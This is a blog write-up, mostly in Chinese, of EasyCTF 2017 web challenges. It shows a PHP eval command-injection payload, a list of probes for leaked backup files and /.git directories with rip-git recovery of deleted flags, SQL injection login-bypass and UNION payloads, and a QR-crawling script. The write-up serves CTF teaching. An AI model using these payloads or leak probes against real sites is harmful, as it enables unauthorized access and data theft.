<!DOCTYPE html><html><head><meta name="google-site-verification" content="1ia5dGzRACgefl6X6Bop8RyCADGr5_2t_cPSC6VuVos"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="robots" content="index,follow"><meta name="description" content="作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/] 博客:HackFun [https://www.hackfun.org]  #0X05-WEB0X05 WEB #COOKIE-BLOGCOOKIE BLOG #PROBLEMPROBLEM I found the cookie monster’s blog [http://cookiebl"><meta name="keywords" content="web,ctf writeup,easyctf"><meta property="og:type" content="article"><meta property="og:title" content="EasyCTF 2017 Web Write Up"><meta property="og:url" content="https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/index.html"><meta property="og:site_name" content="Hackfun"><meta property="og:description" content="作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/] 博客:HackFun [https://www.hackfun.org]  #0X05-WEB0X05 WEB #COOKIE-BLOGCOOKIE BLOG #PROBLEMPROBLEM I found the cookie monster’s blog [http://cookiebl"><meta property="og:image" content="http://i.imgur.com/u0iIWjJ.png"><meta property="og:image" content="http://i.imgur.com/iupLzpS.png"><meta property="og:image" content="http://i.imgur.com/OIAXdXr.png"><meta property="og:image" content="http://i.imgur.com/86dL75P.png"><meta property="og:image" content="http://i.imgur.com/NYv1Q6J.png"><meta property="og:image" content="http://i.imgur.com/bcdipOl.png"><meta property="og:image" content="http://i.imgur.com/HEUFtzW.png"><meta property="og:image" content="http://i.imgur.com/tHQ6iU7.png"><meta property="og:image" content="http://i.imgur.com/ui3q05z.png"><meta property="og:updated_time" content="2017-10-02T19:22:31.921Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="EasyCTF 2017 Web Write Up"><meta name="twitter:description" content="作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/] 博客:HackFun [https://www.hackfun.org]  #0X05-WEB0X05 WEB #COOKIE-BLOGCOOKIE BLOG #PROBLEMPROBLEM I found the cookie monster’s blog [http://cookiebl"><meta name="twitter:image" content="http://i.imgur.com/u0iIWjJ.png"><meta name="twitter:creator" content="@jinglingbiaodi"><link rel="publisher" href="https://plus.google.com/117450799036676139034"><meta property="fb:admins" content="jinglingbiaodi"><meta property="fb:app_id" content="jinglingbiaodi"><link rel="shortcut icon" href="../../../../images/favicon.ico"><link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png"><title>EasyCTF 2017 Web Write Up</title><link rel="stylesheet" href="../../../../css/style.css"><link rel="alternate" href="../../../../atom.xml" title="Hackfun - | Secblog | Pentest | Auditing | Sectool | CTF Write-up" type="application/atom+xml"></head><body><div id="header-post"><a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; $(&quot;html, body&quot;).animate({scrollTop:0},&quot;fast&quot;)" style="display:none" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-><i class="fa fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about/index.html">About</a></li><li><a href="../../../../link/index.html">Link</a></li><li><a href="../../../../tags/kali-linux/index.html">Kali</a></li><li><a href="../../../../archives/index.html">Archives</a></li><li><a href="https://github.com/sunnyelf">Projects</a></li><li><a href="../../../../search/index.html">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="../EasyCTF-2017-Reverse-Pwn-Write-Up/index.html"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-prev&quot;).toggle()" onmouseout="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-prev&quot;).toggle()" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-></i></a></li><li><a class="icon" href="../EasyCTF-2017-Cryptography-Write-Up/index.html"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-next&quot;).toggle()" onmouseout="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-next&quot;).toggle()" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-></i></a></li><li><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; $(&quot;html, body&quot;).animate({scrollTop:0},&quot;fast&quot;)" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-top&quot;).toggle()" onmouseout="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-top&quot;).toggle()" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-></i></a></li><li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-share&quot;).toggle()" onmouseout="if (!window.__cfRLUnblockHandlers) return false; $(&quot;#i-share&quot;).toggle()" onclick="if (!window.__cfRLUnblockHandlers) return false; return $(&quot;#share&quot;).toggle(),!1" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" href="https://www.facebook.com/sharer.php?u=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;text=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;is_video=false&amp;description=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="../../../../cdn-cgi/l/email-protection.html#f4cb8781969e919780c9b195878db7a0b2d4c6c4c5c3d4a39196d4a3869d8091d4a184d2969b908dc9b79c91979fd49b8180d4809c9d87d49586809d979891ced49c80808487cedbdb9c95979f92819ada9b8693dbc6c4c5c3dbc4c0dbc4cddbb195878db7a0b2d9c6c4c5c3d9a39196d9a3869d8091d9a184db"><i class="fa fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://www.tumblr.com/share/link?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;name=EasyCTF%202017%20Web%20Write%20Up&amp;description=%3Cp%3E%E4%BD%9C%E8%80%85:%3Ca%20href=%22https://www.zhihu.com/people/sunnyelf/%22%20target=%22_blank%22%20rel=%22external%22%3EJing%20Ling%3C/a%3E%3Cbr%3E%E5%8D%9A%E5%AE%A2:%3Ca%20href=%22https://www.hackfun.org%22%20target=%22_blank%22%20rel=%22external%22%3EHackFun%3C/a%3E%3C/p%3E%3Ch1%20id=%220x05-Web%22%3E%3Ca%20href=%22#0x05-Web%22%20class=%22headerlink%22%20title=%220x05%20Web%22%3E%3C/a%3E0x05%20Web%3C/h1%3E%3Ch2%20id=%22Cookie-Blog%22%3E%3Ca%20href=%22%23Cookie-Blog%22%20class=%22headerlink%22%20title=%22Cookie%20Blog%22%3E%3C/a%3ECookie%20Blog%3C/h2%3E%3Ch3%20id=%22problem%22%3E%3Ca%20href=%22%23problem%22%20class=%22headerlink%22%20title=%22problem%22%3E%3C/a%3Eproblem%3C/h3%3E%3Cp%3EI%20found%20the%20cookie%20monster%E2%80%99s%20%3Ca%20href=%22http://cookieblog.web.easyctf.com/%22%20target=%22_blank%22%20rel=%22external%22%3Eblog%3C/a%3E!%3C/p%3E"><i class="fa fa-tumblr" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-Web"><span class="toc-number">1.</span> <span class="toc-text">0x05 Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-Blog"><span class="toc-number">1.1.</span> <span class="toc-text">Cookie Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem"><span class="toc-number">1.1.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TinyEval"><span class="toc-number">1.2.</span> <span class="toc-text">TinyEval</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Edge-1"><span class="toc-number">1.3.</span> <span class="toc-text">Edge 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Edge-2"><span class="toc-number">1.4.</span> <span class="toc-text">Edge 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-1"><span class="toc-number">1.5.</span> <span class="toc-text">SQL Injection 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-2"><span class="toc-number">1.6.</span> <span class="toc-text">SQL Injection 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blogbox"><span class="toc-number">1.7.</span> <span class="toc-text">Blogbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-6"><span class="toc-number">1.7.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-tunnel"><span class="toc-number">1.8.</span> <span class="toc-text">Web tunnel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-7"><span class="toc-number">1.8.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-7"><span class="toc-number">1.8.2.</span> <span class="toc-text">solution</span></a></li></ol></li></ol></li></ol></div></span></div><div class="content index width mx-auto px2 my4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">EasyCTF 2017 Web Write Up</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><i class="fa fa-user-secret"></i><span itemprop="name">Jing Ling</span> </span><i class="fa fa-calendar"></i><div class="postdate"><time datetime="2017-04-09T02:31:24.000Z" itemprop="datePublished">2017-04-09</time></div><i class="fa fa-eye"></i><span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span></span><div class="article-tag"><i class="fa fa-tags"></i> <a class="tag-link" href="../../../../tags/ctf-writeup/index.html">ctf writeup</a>, <a class="tag-link" href="../../../../tags/easyctf/index.html">easyctf</a>, <a class="tag-link" href="../../../../tags/web/index.html">web</a></div></div></header><div class="content" itemprop="articleBody"><p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x05-Web"><a href="#0x05-Web" class="headerlink" title="0x05 Web"></a>0x05 Web</h1><h2 id="Cookie-Blog"><a href="#Cookie-Blog" class="headerlink" title="Cookie Blog"></a>Cookie Blog</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>I found the cookie monster’s <a href="http://cookieblog.web.easyctf.com/" target="_blank" rel="external">blog</a>!</p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/u0iIWjJ.png" alt></p><h2 id="TinyEval"><a href="#TinyEval" class="headerlink" title="TinyEval"></a>TinyEval</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>This <a href="http://tinyeval.web.easyctf.com/" target="_blank" rel="external">page</a> will evaluate anything you give it.</p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/iupLzpS.png" alt></p><p>首先想到可能是php的eval()函数，于是随手输入<code>echo（&quot;hello world&quot;）</code>，提示字符太长，最后经过测试最多能输入11个字符。<br>这里用到一个php的技巧</p><pre><code><a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="fc8e939388bc979d9095">[email&#160;protected]</a>:~# cat 1.php 
&lt;?php
eval(&quot;echo`ls`;&quot;);
?&gt;
<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="295b46465d6942484540">[email&#160;protected]</a>:~# php 1.php 
1.php
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
</code></pre><p>于是输入echo<code>ls</code>:</p><p><img src="http://i.imgur.com/OIAXdXr.png" alt></p><p>看到了flag文件了，但是文件名很长，除了echo``，就只能再输入5个字符，所以要找到一个巧妙的方法，多次尝试找到方法：</p><pre><code>echo`cat *`
</code></pre><p>刚好11个字符，获得flag：</p><p><img src="http://i.imgur.com/86dL75P.png" alt></p><h2 id="Edge-1"><a href="#Edge-1" class="headerlink" title="Edge 1"></a>Edge 1</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>We found Edge inc’s website! Take a look at it <a href="http://edge1.web.easyctf.com/" target="_blank" rel="external">here</a>.</p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p>官方提醒说不能使用扫描器，要不然会被BAN，但是搞了一通之后没有什么收获，提醒说不能使用扫描器于是猜测是不是跟源码泄露有关，就手动测试一下：</p><pre><code>index.php~
index.php.vim
index.php.swp
index.php.swn
index.php.swo
index.php.old
index.php.txt
index.php.bak
index.php.zip
index.php.rar
/.svn
/.git
</code></pre><p>测试到<code>/.git</code>终于出现惊喜：</p><p><img src="http://i.imgur.com/NYv1Q6J.png" alt></p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">rip-git</a></p><pre><code><a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="3f4d50504b7f545e5356">[email&#160;protected]</a>:~# rip-git -v -u http://edge1.web.easyctf.com/.git/
<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="681a07071c2803090401">[email&#160;protected]</a>:~/.git# git log
commit ee9061b25d8a35bae8380339f187b44dc26f4999
Author: Michael &lt;<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="3954505a51585c55795c584a405a4d5f175a5654">[email&#160;protected]</a>&gt;
Date:   Mon Mar 13 07:11:47 2017 +0000

    Whoops! Remove flag.

commit afdf86202dc8a3c3d671f2106d5cffa593f2b320
Author: Michael &lt;m<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="b2dbd1dad3d7def2d7d3c1cbd1c6d49cd1dddf">[email&#160;protected]</a>&gt;
Date:   Mon Mar 13 07:11:45 2017 +0000

    Initial.

commit 15ca375e54f056a576905b41a417b413c57df6eb
Author: Fernando &lt;<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="375152455a564e5877505a565e5b1954585a">[email&#160;protected]</a>&gt;
Date:   Sat Dec 14 12:50:09 2013 -0300

    initial version

commit 8ac4f76df2ce8db696d75f5f146f4047a315af22
Author: Fernando Mayo &lt;<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="e38586918e829a8ca3848e828a8fcd808c8e">[email&#160;protected]</a>&gt;
Date:   Sat Dec 14 07:36:18 2013 -0800

    Initial commit
</code></pre><hr><p>回滚到删掉flag之前：</p><pre><code><a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="ee9c81819aae858f8287">[email&#160;protected]</a>:~/.git# git reset –hard afdf86202dc8a3c3d671f2106d5cffa593f2b320
</code></pre><p>根目录出现了flag.txt:</p><pre><code><a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="f3819c9c87b398929f9a">[email&#160;protected]</a>:~/.git# cat flag.txt
easyctf{w3_ev3n_u53_git}
</code></pre><p>推荐文章：<a href="https://www.cdxy.me/?p=757" target="_blank" rel="external">关于WEB敏感文件探测的一点思考</a></p><h2 id="Edge-2"><a href="#Edge-2" class="headerlink" title="Edge 2"></a>Edge 2</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>Last time we screwed up. But we’ve <a href="http://edge2.web.easyctf.com/" target="_blank" rel="external">learned our lesson</a>.</p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>再次访问<code>/.git</code>，结果：</p><p><img src="http://i.imgur.com/bcdipOl.png" alt></p><p>虽然被禁止列目录，但是那些文件依然存在，再次尝试使用rip-git，结果还是下载下来了，接下来就跟Edge 1一样的做法了：</p><pre><code><a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="2755484853674c464b4e">[email&#160;protected]</a>:~# rip-git -v -u http://edge2.web.easyctf.com/.git/
<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="f4869b9b80b49f95989d">[email&#160;protected]</a>:~/.git# git log
commit a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd
Author: Michael &lt;<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="8be6e2e8e3eaeee7cbeeeaf8f2e8ffeda5e8e4e6">[email&#160;protected]</a>&gt;
Date:   Mon Mar 13 07:32:12 2017 +0000

    Prevent directory listing.

commit 6b4131bb3b84e9446218359414d636bda782d097
Author: Michael &lt;<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="64090d070c050108240105171d0710024a070b09">[email&#160;protected]</a>&gt;
Date:   Mon Mar 13 07:32:10 2017 +0000

    Whoops! Remove flag.

commit 26e35470d38c4d6815bc4426a862d5399f04865c
Author: Michael &lt;<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="412c28222920242d01242032382235276f222e2c">[email&#160;protected]</a>&gt;
Date:   Mon Mar 13 07:32:09 2017 +0000

    Initial.

commit 15ca375e54f056a576905b41a417b413c57df6eb
Author: Fernando &lt;<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="bed8dbccd3dfc7d1fed9d3dfd7d290ddd1d3">[email&#160;protected]</a>&gt;
Date:   Sat Dec 14 12:50:09 2013 -0300

    initial version
</code></pre><p>同样回到删掉flag之前：</p><pre><code><a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="186a77776c5873797471">[email&#160;protected]</a>:~/.git# git reset –hard 26e35470d38c4d6815bc4426a862d5399f04865c
<a href="../../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="c0b2afafb480aba1aca9">[email&#160;protected]</a>:~/.git# cat flag.txt
easyctf{hiding_the_problem_doesn&apos;t_mean_it&apos;s_gone!}
</code></pre><h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection 1"></a>SQL Injection 1</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>I need help logging into this website to get my flag! If it helps, my username is <code>admin</code>.<br>Running sqlmap or the likes will earn you an IP ban.</p><p>hint: What does “injection” mean? How can you “inject” code into your username to control the username lookup?</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/HEUFtzW.png" alt></p><p>查看网页源代码，估计SQL语句是这样的：</p><pre><code>select * from users where username=&quot;admin&quot; and password=&quot;&quot;
</code></pre><p>于是任意构造：</p><pre><code>&quot; or &quot;1&quot;=&quot;1

select * from users where username=&quot;admin&quot; and password=&quot;&quot; or &quot;1&quot;=&quot;1&quot;
</code></pre><p>flag：<code>easyctf{a_prepared_statement_a_day_keeps_the_d0ctor_away!}</code></p><h2 id="SQL-Injection-2"><a href="#SQL-Injection-2" class="headerlink" title="SQL Injection 2"></a>SQL Injection 2</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>I’ve told my friend a billion times that the user called <code>leet1337</code> doesn’t exist on this <a href="http://injection2.web.easyctf.com/" target="_blank" rel="external">website</a>, but he won’t listen. Could you please login as this user, even though it doesn’t exist in the database? Oh and also, make sure that the user has a power level over 9000!!!!<br>Running sqlmap or the likes will earn you an IP ban.</p><p>hint: The columns in the table are (not in order) username, password, power_level, and a unique id.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p>根据提示估计SQL语句是这样的：</p><pre><code>select username, password, power_level, id from table where username=&quot;&quot; and password=&quot;&quot;
</code></pre><p>多次尝试使用union查询，#号截断：</p><pre><code>&quot; union select &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;9999&quot;#

select username, password, power_level, id from table where username=&quot;&quot; and password=&quot;&quot; union select &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;9999&quot;#&quot;
</code></pre><h2 id="Blogbox"><a href="#Blogbox" class="headerlink" title="Blogbox"></a>Blogbox</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>I found another <a href="http://blogbox.web.easyctf.com/" target="_blank" rel="external">blog</a>! Do you think you can find a flag on it?</p><p>Hint: Use the search bar to see all the public posts! (And only the public posts!)</p><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/tHQ6iU7.png" alt><br>根据提示进行搜索，但是不论输入什么都得不到想要得结果，搜索时GET请求类似这样：</p><p><a href="http://blogbox.web.easyctf.com/search?query=flag" target="_blank" rel="external">http://blogbox.web.easyctf.com/search?query=flag</a></p><p>后来看提示我们只能看到公开的（<code>public</code>）文章，于是想到搜索有可能还可以传入<code>public</code>这个参数：<br>最终：<code>http://blogbox.web.easyctf.com/search?query=ctf&amp;public=0</code></p><p><img src="http://i.imgur.com/ui3q05z.png" alt></p><h2 id="Web-tunnel"><a href="#Web-tunnel" class="headerlink" title="Web tunnel"></a>Web tunnel</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>I was just going to search some random cat videos on a Saturday morning when my friend came up to me and told me to reach the end of this <a href="http://tunnel.web.easyctf.com/" target="_blank" rel="external">tunnel</a>. Can you do it for me?</p><p>Hint: You should write a script for this. The tunnel goes on too deep for any normal human.</p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><p>打开网站，得到一张二维码，扫描之后得到的字符串又做为下一个二维码图片的路径，就这样循环，那么上脚本：</p><pre><code>import requests

QR_api = &apos;https://api.qrserver.com/v1/read-qr-code/&apos;
QR_name =&apos;DaicO7460493nYSuvLPW&apos;

while True:
    if &apos;easyctf&apos; not in QR_name:
        QR_url = &apos;http://tunnel.web.easyctf.com/images/&apos; + QR_name + &apos;.png&apos;
        r = requests.get(url = QR_api, params = {&apos;fileurl&apos; : QR_url})
        QR_name = r.json()[0][&quot;symbol&quot;][0][&quot;data&quot;]
    else:
        break
print(QR_name) # easyctf{y0u_sh0uld_b3_t1r3d_tr4v3ll1ng_all_th1s_w4y}
</code></pre></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about/index.html">About</a></li><li><a href="../../../../link/index.html">Link</a></li><li><a href="../../../../tags/kali-linux/index.html">Kali</a></li><li><a href="../../../../archives/index.html">Archives</a></li><li><a href="https://github.com/sunnyelf">Projects</a></li><li><a href="../../../../search/index.html">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-Web"><span class="toc-number">1.</span> <span class="toc-text">0x05 Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-Blog"><span class="toc-number">1.1.</span> <span class="toc-text">Cookie Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem"><span class="toc-number">1.1.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TinyEval"><span class="toc-number">1.2.</span> <span class="toc-text">TinyEval</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Edge-1"><span class="toc-number">1.3.</span> <span class="toc-text">Edge 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Edge-2"><span class="toc-number">1.4.</span> <span class="toc-text">Edge 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-1"><span class="toc-number">1.5.</span> <span class="toc-text">SQL Injection 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-2"><span class="toc-number">1.6.</span> <span class="toc-text">SQL Injection 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blogbox"><span class="toc-number">1.7.</span> <span class="toc-text">Blogbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 